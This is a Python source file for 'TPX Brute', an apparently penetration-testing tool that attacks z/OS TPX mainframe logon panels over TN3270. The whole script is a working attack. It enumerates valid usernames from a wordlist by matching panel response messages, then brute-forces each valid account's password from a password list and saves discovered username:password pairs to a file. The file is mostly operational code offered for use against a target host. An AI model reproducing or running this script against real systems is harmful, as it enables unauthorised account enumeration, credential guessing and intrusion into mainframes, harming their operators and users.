#!/usr/bin/python
# -*- coding: utf-8 -*-

from py3270 import EmulatorBase
from termcolor import colored
import time, platform, sys, argparse, re

############################################################################
#  ADPAPT SECTION: TO MODIFY FOR YOUR TARGET
############################################################################
#Need to modify these 4 following messages because messages returned by TPX can be specified by Z/OS administrators
INVALID_USERNAME = "NOT AUTHORIZED MESSAGE" #Message when the username is invalid
VALID_USERNAME = "PASSWORD NOT GIVEN MESSAGE" #Message when the username is valid
INVALID_PASSWORD = "INVALID PASSWORD MESSAGE" #Message when the password is invalid for a valid user
VALID_PASSWORD = "VALID CREDENTIALS MESSAGE" #Message when the password is valid for a specific user
#Parameters: You have to modify for your TPX env
try: # Interpreter will raise exception while parsing (! executing) the file, hence the use of exec()
	exec('FIELD_X_TPX_VERSION = ?') # X Position of the TPX version
	exec('FIELD_Y_TPX_VERSION = ?') # X Position of the TPX version
	exec('FIELD_LENGTH_TPX_VERSION = ?') # Length of the TPX version
	exec('FIELD_X_USERNAME = ?') #X Position of the username field on the TPX interface
	exec('FIELD_Y_USERNAME = ?') #Y Position of the username flied on the TPX interface
	exec('FIELD_X_PASSWORD = ?') #X Position of the pasword field on the TPX interface
	exec('FIELD_Y_PASSWORD = ?') #Y Position of the pasword field on the TPX interface
	exec('FIELD_X_MESSAGE = ?') #X Position of the message returned on the TPX interface
	exec('FIELD_Y_MESSAGE = ?') #Y Position of the message returned on the TPX interface
except SyntaxError:
	print '[!] Please have a look at the "ADPAPT" section in the script, and tweak it according to your needs!'
	sys.exit(1)
############################################################################

# Parse arguments
def parse_args():
	#start argument parser
	parser = argparse.ArgumentParser(description='TPX Brute - The z/OS TPX logon panel brute forcer.',epilog='')
	parser.add_argument('-t','--target', help='target IP address and port: TARGET[:PORT] default port is 23', required=True,dest='target')
	parser.add_argument('-s','--sleep',help='Seconds to sleep between actions (increase on slower systems). The default is 1 second.',default=1,type=int,dest='sleep')
	parser.add_argument('-u','--userfile',help='File containing list of usernames', required=False,dest='userfile')
	parser.add_argument('-p','--passfile',help='File containing list of passwords',dest='passfile')
	parser.add_argument('-m','--moviemode',help='Enables Movie Mode. Watch in real time TPX view',default=False,dest='movie_mode',action='store_true')
	parser.add_argument('-e','--enumerate',help='Enables Enumeration Mode Only. Default is brute force mode',default=False,dest='enumeration',action='store_true')
	parser.add_argument('-l','--login',help='Display login screen (might help you to figure out the offsets (X,Y)',default=False,dest='login',action='store_true')
	parser.add_argument('-f','--force',help='Force to go through enumeration/bruteforce (e.g. version not displayed)',default=False,dest='force',action='store_true')
	parser.add_argument('-q','--quiet',help='Only display found users/passwords',default=False,dest='quiet',action='store_true')
	parser.add_argument('-o','--output',help='Write found users/passwords into file',required=False, default='out.txt',dest='outputfile')
	return parser.parse_args()

# Get file content into a list
def get_file_content(filename):
	content = []
	with open(filename, 'r') as fin:
		content = [x.strip() for x in fin.readlines()]
	fin.close() # not really needed
	return content

# Write data into file
def write_file_content(filename, data):
	with open(filename, 'a') as fout:
		fout.write(data+'\n')
	fout.close()

# Connect to the target machine and sleep for 'sleep' seconds
def connect_to_ZOS():
	print '[+] Connecting to %s ... (can take some time)' % (results.target)
	em.connect(results.target)
	time.sleep(results.sleep)
	if not em.is_connected():
		sys.exit('[-] Could not connect to %s. Aborting!' % (results.target))

# Print TPX login screen (might help you figure out the offsets: X & Y)
def print_login_screen():
	screen_result = em.exec_command('Query(ScreenCurSize)')
	y, x = int(screen_result.data[0].split(' ')[0]), int(screen_result.data[0].split(' ')[1])
	print '[+] Screen resolution: x:%d & y:%d \n' % (x, y)

	# Print X axis
	x_row = list([str('%02d' % n) for n in range(x)])
	print 'XX%s' % (''.join(n[0] for n in x_row))
	print 'XX%s' % (''.join(n[1] for n in x_row))

	# Print Y axis
	for i in range(1, y):
		buff = em.string_get(i,1,x)
		print '%02d %s' % (i, buff)

	# Print X axis (once again)
	print 'XX%s' % (''.join(n[0] for n in x_row))
	print 'XX%s' % (''.join(n[1] for n in x_row))

	# Get cursor position
	cursor_position = em.exec_command('Query(Cursor)')
	y, x = int(cursor_position.data[0].split(' ')[0]) + 1, int(cursor_position.data[0].split(' ')[1]) + 1
	print '\n[+] Cursor is blinking at x:%d, y:%d, seems like a good area to look at!' % (x,y)
	return x,y

# Find TPX version
def find_version():
	#make sure we're actually at the TPX logon screen
	tpxVersion = em.string_get(FIELD_X_TPX_VERSION, FIELD_Y_TPX_VERSION, FIELD_LENGTH_TPX_VERSION)
	if 'TPX' in tpxVersion:
		print '[+] TPX detected. Version: %s' % (tpxVersion)
		return True
	else:
		print '[-] Cannot detect TPX version!'
		if not results.force:
			 print '[-] Aborting... (or use -f/--force to bypass TPX version)'
		return False

# Is this a correct username?
def check_correct_username(username):
	msg = ''
	if username[0].isdigit():
		msg = ' |- %s -- [!] Usernames cannot start with a number, skipping' % (username)
	elif not re.match('^[a-zA-Z0-9#@$]+$', username):
		msg = ' |- %s -- [!] Username contains an invalid character (Only A-z, 0-9, #, $ and @), skipping'  % (username)
	elif len(username.strip()) > 7: #TSO only allows a username of 7 characters so don't bother trying it
		msg = ' |- %s -- [!] Username too long ( >7 )'  % (username)
	else:
		return True

	# Something to display?
	if msg and not results.quiet:
		print msg
	return False

# Is this a correct password?
def check_correct_password(password):
	msg = ''
	if not re.match('^[a-zA-Z0-9#@$]+$', password):
		msg = '[--] %s -- [!] Password contains an invalid character (Only A-z, 0-9, #, $ and @)' % (password)
	elif len(password) > 8:
		msg = '[--] %s -- [!] Password too long ( >8 )' % (password)
	else:
		return True

	# Something to display?
	if msg and not results.quiet:
		print msg
	return False

# Send TPX login info
def send_TPX_info(x, y, data, size=7):
	time.sleep(results.sleep)
	em.fill_field(y, x, data, size)
	em.send_enter()

# Get response from TPX
def get_TPX_response(x, y, invalid_msg, valid_msg):
	if em.string_found(y, x, invalid_msg):
		return -1
	elif em.string_found(y, x, valid_msg):
		return 0
	else:
		return 1

# Check for valid credentials
def check_valid_login(x, y, username, password=None):
	if password == None: # only login
		result = get_TPX_response(x, y, INVALID_USERNAME, VALID_USERNAME)
		if result == 0:
			print colored(' |- Username: %s VALID' % (username), 'green')
			return True
		elif result == -1 and not results.quiet:
			print colored(' |- Username: %s invalid'  % (username), 'red')
		elif result == 1 and not results.quiet:
			print colored(' |- Username: %s ERROR unknown, you should modify'  % (username), 'yellow')
	else: # password
		result = get_TPX_response(x, y, INVALID_PASSWORD, VALID_PASSWORD)
		if result == 0:
			print colored(' |- Password: %s is valid for user: %s' % (password, username), 'green')
			return True
		elif result == -1 and not results.quiet:
			print colored(' |- Password: %s is not valid for user: %s'  % (password, username), 'green')
		elif result == 1 and not results.quiet:
			print colored(' |- Password: %s ERROR unknown, you should modify'  % (username), 'yellow')
	return False

# Enumeration or Bruteforce
def do_work(bf=False):
	connect_to_ZOS()
	if find_version() or results.force:
		print '[+] Testing each username stored in %s - %d entrie(s)' % (results.userfile, len(userfile))
		for username in userfile:
			# Correctly formated username
			if check_correct_username(username):
				# Send login info
				send_TPX_info(FIELD_X_USERNAME, FIELD_Y_USERNAME, username)
				# Check response
				valid_username = check_valid_login(FIELD_X_MESSAGE, FIELD_Y_MESSAGE, username)
				em.exec_command('PrintText(html,tso_screen.html)') # Screen HTML

				if (valid_username and results.outputfile and not bf): # Write only if no bf and output selected
					write_file_content(results.outputfile, username)

				if valid_username and bf:
					passfile=get_file_content(results.passfile)
					print '[++] Starting bruteforce for %s - %d entrie(s)' % (username, len(passfile))
					for password in passfile:
						# Correctly formated password
						if check_correct_password(password):
							time.sleep(results.sleep)
							send_TPX_info(FIELD_X_PASSWORD, FIELD_Y_PASSWORD, password, len(password))
							em.exec_command('PrintText(html,tso_screen.html)')
							# Check creds (username + password)
							if (check_valid_login(FIELD_X_MESSAGE, FIELD_Y_MESSAGE, username, password)):
								if (results.outputfile):
									write_file_content(results.outputfile, '%s:%s' % (username, password))
									### /!\ In some case (e.g. no code/response for valid password but screen does change)
									### you might need to get back to the previous screen
									#send_TPX_info(16, 42, 'K') # Kill session
								break # no need to go further
							# Found no valid password ?
							if (results.outputfile):
								write_file_content(results.outputfile, '%s' % (username))
					print '[++] Done bruteforce for %s' % (username)

########################
### Main starts here ###
########################
print '[+] TPX Brute - The z/OS TPX logon panel enumerator/brute forcer.\n'
if platform.system() == 'Linux':
	#The location of the x3270 and s3270 programs
	class Emulator(EmulatorBase):
		x3270_executable = '/usr/bin/x3270'
		s3270_executable = '/usr/bin/s3270'
else:
	sys.exit('[!] Your Platform: %s is not supported at this time. Aborting...' % (platform.system()))

results = parse_args() # put the arg results in the variable results

print '[+] Target:\t\t %s' % (results.target)
print '[+] Attack platform:\t %s' % (platform.system())

# Set Movie mode
if results.movie_mode:
	if not results.quiet:
		print '[+] Movie Mode:\t\t ENABLED'
	em = Emulator(visible=True)
else:
	if not results.quiet:
		print '[+] Movie Mode:\t\t DISABLED'
	em = Emulator()

# Display login screen
if results.login:
	print '\n[+] Print login screen'
	connect_to_ZOS()
	x,y = print_login_screen()
	print '[+] Exiting normally...'
	sys.exit()

# Userfile always required
if not results.userfile:
	sys.exit('[!] Userfile (-u/--userfile) is required! Aborting...')

# Userfile
print '[+] Username File:\t %s' % (results.userfile)
userfile = get_file_content(results.userfile) # open the usernames file

# Enable 'quiet mode'
if results.quiet:
	print '[+] Quiet Mode:\t\t ENABLED'

# Force mode
if results.force:
	print '[+] Force Mode:\t\t ENABLED'

# Sleep time
print '[+] Wait (Sds):\t\t %s' % (results.sleep)

# Output file
if results.outputfile:
	print '[+] Output file:\t %s' % (results.outputfile)

if results.enumeration:
	# do Enumeration
	print '\n[+] Starting enumeration'
	do_work()
	print '\n[+] Enumeration done!'
else:
	# do bruteforce
	if not results.passfile:
		sys.exit('\n[!] Enumeration mode only is not enabled (-e). Password file (-p) is required! Aborting...')
	print '[+] Password Listing:\t %s' % (results.passfile)
	print '\n[+] Starting bruteforce'
	do_work(bf=True)
	print '\n[+] Bruteforce done!'

print '[+] Exiting normally...'
# Close the connection
em.terminate()
